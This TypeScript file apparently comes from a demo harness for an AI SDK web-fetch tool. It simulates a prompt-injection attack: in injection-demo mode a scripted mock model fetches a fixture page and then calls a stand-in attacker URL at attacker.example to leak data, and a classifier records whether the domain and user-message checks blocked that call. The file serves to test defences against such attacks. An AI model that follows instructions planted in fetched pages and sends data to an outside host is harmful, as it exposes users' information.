import { createOpenAI } from "@ai-sdk/openai"
import { experimental_createWebFetchTool as createWebFetchTool } from "@ai-sdk/tool-web-fetch"
import { generateText, isStepCount, type CoreMessage } from "ai"
import { MockLanguageModelV4 } from "ai/test"
import {
  ATTACKER_LEAK_URL,
  FIXTURE_INJECTION_URL,
} from "./constants"
import { createFixtureAwareFetch } from "./fixture-fetch"
import { resolveSafety, type SafetyOptions } from "./tool-options"

export type ChatToolStep = {
  toolCallId: string
  toolName: string
  input: { url: string; offset?: number }
  output: unknown
  leakStatus?: "leaked" | "blocked" | "neutral"
}

export type ChatApiResult = {
  text: string
  steps: ChatToolStep[]
  injectionOutcome?: "leaked" | "blocked"
}

const usage = {
  inputTokens: {
    total: 10,
    noCache: 10,
    cacheRead: undefined,
    cacheWrite: undefined,
  },
  outputTokens: {
    total: 5,
    text: 5,
    reasoning: undefined,
  },
}

function classifyLeak(url: string, output: { type?: string; errorCode?: string }) {
  if (!url.startsWith("https://attacker.example/")) {
    return "neutral" as const
  }
  if (output.type === "document") {
    return "leaked" as const
  }
  if (
    output.type === "error" &&
    (output.errorCode === "url_not_allowed" ||
      output.errorCode === "url_not_in_user_message")
  ) {
    return "blocked" as const
  }
  return "neutral" as const
}

function buildMockModel(injectionDemo: boolean) {
  if (injectionDemo) {
    return new MockLanguageModelV4({
      doGenerate: [
        {
          content: [
            {
              type: "tool-call",
              toolCallId: "call-fixture",
              toolName: "webFetch",
              input: JSON.stringify({ url: FIXTURE_INJECTION_URL }),
            },
          ],
          finishReason: { unified: "tool-calls", raw: undefined },
          usage,
          warnings: [],
        },
        {
          content: [
            {
              type: "tool-call",
              toolCallId: "call-leak",
              toolName: "webFetch",
              input: JSON.stringify({ url: ATTACKER_LEAK_URL }),
            },
          ],
          finishReason: { unified: "tool-calls", raw: undefined },
          usage,
          warnings: [],
        },
        {
          content: [
            {
              type: "text",
              text: "Finished reviewing the fixture page.",
            },
          ],
          finishReason: { unified: "stop", raw: undefined },
          usage,
          warnings: [],
        },
      ],
    })
  }

  const model = new MockLanguageModelV4({
    doGenerate: async (options) => {
      const step = model.doGenerateCalls.length
      if (step === 1) {
        const lastUser = [...options.prompt].reverse().find((m) => m.role === "user")
        const text =
          typeof lastUser?.content === "string"
            ? lastUser.content
            : Array.isArray(lastUser?.content)
              ? lastUser.content
                  .filter((part) => part.type === "text")
                  .map((part) => part.text)
                  .join(" ")
              : ""

        const urlMatch = text.match(/https?:\/\/[^\s)]+/i)
        const url = urlMatch?.[0] ?? "https://example.com"

        return {
          content: [
            {
              type: "tool-call",
              toolCallId: "call-1",
              toolName: "webFetch",
              input: JSON.stringify({ url }),
            },
          ],
          finishReason: { unified: "tool-calls", raw: undefined },
          usage,
          warnings: [],
        }
      }

      return {
        content: [{ type: "text", text: "Fetched the page from your message." }],
        finishReason: { unified: "stop", raw: undefined },
        usage,
        warnings: [],
      }
    },
  })
  return model
}

export async function handleChatRequest({
  message,
  injectionDemo,
  useRealModel,
  useFixtureTransport,
  safety,
}: {
  message: string
  injectionDemo: boolean
  useRealModel: boolean
  useFixtureTransport: boolean
  safety?: SafetyOptions
}): Promise<ChatApiResult> {
  const resolved = resolveSafety(safety)
  const webFetch = createWebFetchTool({
    allowedDomains: resolved.allowedDomains,
    requireUrlInUserMessage: resolved.requireUrlInUserMessage,
    maxLength: resolved.maxLength,
    fetch: createFixtureAwareFetch(useFixtureTransport),
  })

  const messages: CoreMessage[] = [{ role: "user", content: message }]

  const model =
    useRealModel && process.env.OPENAI_API_KEY
      ? createOpenAI({ apiKey: process.env.OPENAI_API_KEY })("gpt-4o-mini")
      : buildMockModel(injectionDemo)

  const result = await generateText({
    model,
    tools: { webFetch },
    stopWhen: isStepCount(5),
    messages,
  })

  const steps: ChatToolStep[] = []
  for (const step of result.steps) {
    for (const call of step.toolCalls) {
      const matching = step.toolResults.find((r) => r.toolCallId === call.toolCallId)
      const output = matching?.output ?? { type: "error", message: "No result" }
      const input = call.input as { url: string; offset?: number }
      const leakStatus = classifyLeak(input.url, output as { type?: string; errorCode?: string })
      steps.push({
        toolCallId: call.toolCallId,
        toolName: call.toolName,
        input,
        output,
        leakStatus,
      })
    }
  }

  const leakStep = steps.find((s) => s.leakStatus === "leaked" || s.leakStatus === "blocked")

  return {
    text: result.text,
    steps,
    injectionOutcome:
      leakStep?.leakStatus === "leaked"
        ? "leaked"
        : leakStep?.leakStatus === "blocked"
          ? "blocked"
          : undefined,
  }
}
